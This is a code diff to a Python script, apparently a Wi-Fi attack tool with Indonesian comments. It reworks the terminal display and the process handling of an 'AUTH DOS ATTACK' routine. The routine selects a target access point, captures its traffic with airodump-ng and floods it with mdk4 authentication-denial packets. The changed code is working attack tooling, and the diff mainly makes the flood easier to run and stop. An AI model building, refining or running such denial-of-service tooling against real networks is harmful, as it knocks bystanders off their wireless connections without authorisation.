@@ -31,7 +31,7 @@ YELLOW = COLORS["yellow"]
 MAGENTA = COLORS["magenta"]
 GRAY = COLORS["gray"]
 
-BOX_WIDTH = 44
+BOX_WIDTH = 50
 
 # ================= CLEAR SCREEN =================
 
@@ -56,6 +56,18 @@ def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
     print(
         f"  {color}{BOLD}║{RESET}"
         f"{text_color}{BOLD}{inner}{RESET}"
+        f"{' ' * pad}"
+        f"{color}{BOLD}║{RESET}"
+    )
+
+def draw_box_line(text: str, color=GRAY):
+    pad = BOX_WIDTH - len(text)
+    if pad < 0:
+        text = text[:BOX_WIDTH]
+        pad = 0
+    print(
+        f"  {color}{BOLD}║{RESET}"
+        f"{text}{RESET}"
         f"{' ' * pad}"
         f"{color}{BOLD}║{RESET}"
     )
@@ -373,59 +385,19 @@ def select_target(networks):
 
 # ================= ATTACK FUNCTIONS =================
 
-def check_target_status(bssid, channel, monitor_iface, duration=2):
-    """Cek apakah target masih terdeteksi"""
-    temp_dir = tempfile.mkdtemp(prefix="airodump-check-", dir="/tmp")
-    prefix = os.path.join(temp_dir, "check")
-    
-    proc = subprocess.Popen(
-        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, 
-         "--write", prefix, "--output-format", "csv", monitor_iface],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-    )
-    
-    time.sleep(duration)
-    proc.terminate()
-    try:
-        proc.wait(timeout=2)
-    except:
-        proc.kill()
-        proc.wait()
-    
-    target_found = False
-    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
-        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
-            reader = csv.reader(handle)
-            for row in reader:
-                if len(row) > 0 and bssid in row[0]:
-                    target_found = True
-                    break
-        if target_found:
-            break
-    
-    for path in glob.glob(prefix + "-*.csv"):
-        try:
-            os.remove(path)
-        except:
-            pass
-    try:
-        os.rmdir(temp_dir)
-    except:
-        pass
-    
-    return target_found
-
 def run_attack(target, monitor_iface):
     clear_screen()
     draw_box_top(RED)
     draw_box_title("AUTH DOS ATTACK", RED, YELLOW)
     draw_box_bottom(RED)
     
-    print(f"\n  {CYAN}[*] Target: {target['essid']}{RESET}")
-    print(f"  {CYAN}[*] BSSID: {target['bssid']}{RESET}")
-    print(f"  {CYAN}[*] Channel: {target['channel']}{RESET}")
-    print(f"  {YELLOW}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
+    draw_box_line(f"  [*] Target: {target['essid']}", CYAN)
+    draw_box_line(f"  [*] BSSID: {target['bssid']}", CYAN)
+    draw_box_line(f"  [*] Channel: {target['channel']}", CYAN)
+    draw_box_line(f"  [!] Tekan Ctrl+C untuk menghentikan", YELLOW)
+    draw_box_bottom(RED)
+    
+    print()
     
     # Jalankan airodump-ng di background
     dump_cmd = [
@@ -451,18 +423,26 @@ def run_attack(target, monitor_iface):
     print(f"  {GRAY}{' '.join(mdk4_cmd)}{RESET}")
     print(f"  {GRAY}{'=' * 50}{RESET}\n")
     
+    mdk4_proc = None
     try:
-        # Output MDK4 langsung ke terminal (DERES)
-        result = subprocess.run(mdk4_cmd)
-        if result.returncode != 0 and result.returncode != -2:
-            print(f"  {RED}MDK4 auth dos gagal dengan kode keluar {result.returncode}.{RESET}")
+        # Jalankan MDK4 dengan Popen biar bisa di-terminate
+        mdk4_proc = subprocess.Popen(mdk4_cmd)
+        mdk4_proc.wait()
     except KeyboardInterrupt:
-        print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
+        print(f"\n  {YELLOW}[!] Keyboard interrupt diterima. Menghentikan serangan...{RESET}")
+        if mdk4_proc and mdk4_proc.poll() is None:
+            mdk4_proc.terminate()
+            try:
+                mdk4_proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                mdk4_proc.kill()
+                mdk4_proc.wait()
+        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
     finally:
-        if dump_proc.poll() is None:
+        if dump_proc and dump_proc.poll() is None:
             dump_proc.terminate()
             try:
-                dump_proc.wait(timeout=5)
+                dump_proc.wait(timeout=3)
             except subprocess.TimeoutExpired:
                 dump_proc.kill()
                 dump_proc.wait()
